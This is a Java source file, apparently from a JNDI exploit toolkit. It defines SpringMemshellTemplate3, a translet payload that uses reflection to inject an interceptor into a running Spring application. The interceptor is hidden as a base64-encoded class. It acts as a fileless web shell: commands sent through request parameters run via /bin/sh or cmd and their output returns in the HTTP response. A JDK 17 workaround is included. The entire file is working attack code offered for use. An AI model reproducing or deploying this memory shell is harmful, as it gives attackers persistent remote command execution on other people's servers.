package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;

// for JDK 17 and above

// when using SpringMemshellTemplate2,
// java.lang.reflect.InaccessibleObjectException:
// Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible:
// module java.base does not "opens java.lang" to unnamed module @c730b35
public class SpringMemshellTemplate3 extends AbstractTranslet {

    public SpringMemshellTemplate3(){
        // for JDK 17 and above
        System.out.println("[+] Add Dynamic Interceptor3");

        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            java.lang.reflect.Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                clazz = classLoader.loadClass("com.feihong.ldap.template.DynamicInterceptorTemplate3");
            }catch(ClassNotFoundException e){
                try{
                    String codeClass = "yv66vgAAADUA9QoAAgADBwAEDAAFAAYBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEABjxpbml0PgEAAygpVggACAEABHBhc3MJAAoACwcADAwADQAOAQA1Y29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZTMBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7CgAKABAMABEABgEACmluaXRpYWxpemUJABMAFAcAFQwAFgAXAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwgAGQEAI1srXSBEeW5hbWljIEludGVyY2VwdG9yMyBzYXlzIGhlbGxvCgAbABwHAB0MAB4AHwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAAhAQAEdHlwZQsAIwAkBwAlDAAmACcBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACkBAAViYXNpYwoAKwAsBwAtDAAuAC8BABBqYXZhL2xhbmcvU3RyaW5nAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaCgArADEMADIAMwEAB2lzRW1wdHkBAAMoKVoJADUANgcANwwAOAAOAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yCAA6AQABLwgAPAEABy9iaW4vc2gIAD4BAAItYwgAQAEAA2NtZAgAQgEAAi9DBwBEAQARamF2YS91dGlsL1NjYW5uZXIKAEYARwcASAwASQBKAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBGAEwMAE0ATgEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBQAFEHAFIMAFMAVAEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAQwBWDAAFAFcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFkBAAJcQQoAQwBbDABcAF0BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAEMAXwwAYABhAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CwBjAGQHAGUMAGYAZwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsKAGkAHAcAagEAE2phdmEvaW8vUHJpbnRXcml0ZXIKAGwAbQcAbgwAbwBwAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAbAByDABzAHQBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7CAB2AQAnY29tLmZlaWhvbmcubGRhcC50ZW1wbGF0ZS5NeUNsYXNzTG9hZGVyCgB4AHkHAHoMAHsAfAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsJAAoAfgwAfwCAAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsHAIIBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbggAhAEDHHl2NjZ2Z0FBQURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNsTVkyOXRMMlpsYVdodmJtY3ZiR1JoY0M5MFpXMXdiR0YwWlM5TmVVTnNZWE56VEc5aFpHVnlPd0VBQVdNQkFCZE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUMyUmxabWx1WlVOc1lYTnpBUUFzS0Z0Q1RHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFWaWVYUmxjd0VBQWx0Q0FRQUxZMnhoYzNOTWIyRmtaWElCQUFwVGIzVnlZMlZHYVd4bEFRQVNUWGxEYkdGemMweHZZV1JsY2k1cVlYWmhEQUFHQUFjQkFDZGpiMjB2Wm1WcGFHOXVaeTlzWkdGd0wzUmxiWEJzWVhSbEwwMTVRMnhoYzNOTWIyRmtaWElNQUE4QUdnRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUZ5aGJRa2xKS1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QUNFQUFnQUZBQUFBQUFBQ0FBQUFCZ0FIQUFFQUNBQUFBRG9BQWdBQ0FBQUFCaW9ydHdBQnNRQUFBQUlBQ1FBQUFBWUFBUUFBQUFRQUNnQUFBQllBQWdBQUFBWUFDd0FNQUFBQUFBQUdBQTBBRGdBQkFBa0FEd0FRQUFFQUNBQUFBRVFBQkFBQ0FBQUFFTHNBQWxrcnR3QURLZ01xdnJZQUJMQUFBQUFDQUFrQUFBQUdBQUVBQUFBSUFBb0FBQUFXQUFJQUFBQVFBQkVBRWdBQUFBQUFFQUFUQUE0QUFRQUJBQlFBQUFBQ0FCVT0KAIYAhwcAiAwAiQCKAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7CgCMAI0HAI4MAI8AkAEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IIAJIBAClbKl0gamF2YS5sYW5nLmludm9rZS5NZXRob2RIYW5kbGVzLmxvb2t1cAoAlACVBwCWDACXAJgBAB5qYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMBAAZsb29rdXABACkoKUxqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwOwoAmgCbBwCcDACdAJ4BACVqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsHAKABACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgoAnwCiDACjAAYBAA9wcmludFN0YWNrVHJhY2UIAKUBAF9DOlxyZXBvc1xKTkRJRXhwbG9pdFx0YXJnZXRcY2xhc3Nlc1xjb21cZmVpaG9uZ1xsZGFwXHRlbXBsYXRlXER5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlMy5jbGFzcwoApwCoBwCpDACqAKsBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsKAK0ArgcArwwAsACxAQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgcAswEAHWphdmEvaW8vRmlsZU5vdEZvdW5kRXhjZXB0aW9uBwC1AQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24KALQAtwwABQC4AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWBwC6AQATamF2YS9pby9JT0V4Y2VwdGlvbgoAhgC8DAC9AL4BAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoAwADBBwDCDADDAMQBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAN0xjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlMzsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBAAFrAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlBwDNAQAKRXhjZXB0aW9ucwcA2gEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARjb2RlAQAFYnl0ZXMBAAJbQgEABHZhcjgBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABHZhcjkBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxjbGFzc0NvbnRlbnQBAAFlAQAfTGphdmEvaW8vRmlsZU5vdEZvdW5kRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEABGFyZ3MBABJiYXNlNjRDbGFzc0NvbnRlbnQHAN0BAApTb3VyY2VGaWxlAQAgRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUzLmphdmEBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwEADElubmVyQ2xhc3NlcwEAB0RlY29kZXIBAAZMb29rdXABAAdFbmNvZGVyACEACgACAAAAAgACAH8AgAAAAAIADQAOAAAABAABAAUABgABAMUAAABFAAIAAQAAAA8qtwABKhIHtQAJKrcAD7EAAAACAMYAAAASAAQAAAAUAAQAEgAKABUADgAWAMcAAAAMAAEAAAAPAMgAyQAAAAEAygDLAAIAxQAAAU4ABAAHAAAAn7IAEhIYtgAaKxIguQAiAgDGAI0rEiC5ACICABIotgAqmQB9Kyq0AAm5ACICADoEGQTGAGwZBLYAMJoAZLIANBI5tgAqmQAbBr0AK1kDEjtTWQQSPVNZBRkEUzoFpwAYBr0AK1kDEj9TWQQSQVNZBRkEUzoFuwBDWbgARRkFtgBLtgBPtwBVEli2AFq2AF46Biy5AGIBABkGtgBoA6wErAAAAAMAxgAAAC4ACwAAABkACAAbACMAHAAvAB0APAAfAEcAIABfACIAdAAlAJAAJgCbACcAnQArAMcAAABSAAgAXAADAMwAzQAFAHQAKQDMAM0ABQCQAA0AzgAOAAYALwBuAM8ADgAEAAAAnwDIAMkAAAAAAJ8A0ADRAAEAAACfANIA0wACAAAAnwDUANUAAwDWAAAAEQAD/ABfBwAr/AAUBwDX+QAoANgAAAAEAAEA2QACABEABgABAMUAAAD2AAMABQAAAD64AGu2AHFMKisSdbYAd7UAfacAJE0Sg064AIUttgCLOgSyABISkbYAGiq4AJMZBLYAmbUAfacACEwrtgChsQACAAcAEQAUAIEAAAA1ADgAnwADAMYAAAAyAAwAAAAwAAcAMwARAEUAFAA0ABUANQAYADYAIQBCACkAQwA1AEgAOABGADkARwA9AEoAxwAAAD4ABgAYAB0A2wAOAAMAIQAUANwA3QAEABUAIADeAN8AAgAHAC4A4ADhAAEAOQAEAOIA4wABAAAAPgDIAMkAAADWAAAAGgAE/wAUAAIHAAoHAHgAAQcAgfoAIEIHAJ8EAAkA5ADlAAEAxQAAANYAAwADAAAANBKkA70AK7gAprgArEynABdNuwC0WSy3ALa/TbsAtFkstwC2v7gAuyu2AL9NsgASLLYAGrEAAgAAAA0AEACyAAAADQAaALkAAwDGAAAAJgAJAAAATwANAFQAEABQABEAUQAaAFIAGwBTACQAVgAsAFcAMwBYAMcAAAA+AAYADQADAOYA3QABABEACQDnAOgAAgAbAAkA5wDpAAIAAAA0AOoAzQAAACQAEADmAN0AAQAsAAgA6wAOAAIA1gAAABAAA1AHALJJBwC5/AAJBwDsAAMA7QAAAAIA7gDvAAAABgABAPAAAADxAAAAGgADAIwAhgDyAAkAmgCUAPMAGQDAAIYA9AAJ";
                    byte[] bytes = java.util.Base64.getDecoder().decode(codeClass);

//                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    method.setAccessible(true);
//                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//                    clazz = java.lang.invoke.MethodHandles.lookup().defineClass(bytes);
                    MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.lookup();
                    Method method = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                    clazz = (Class) method.invoke(lookup, bytes);
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }

            adaptedInterceptors.add(clazz.newInstance());
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
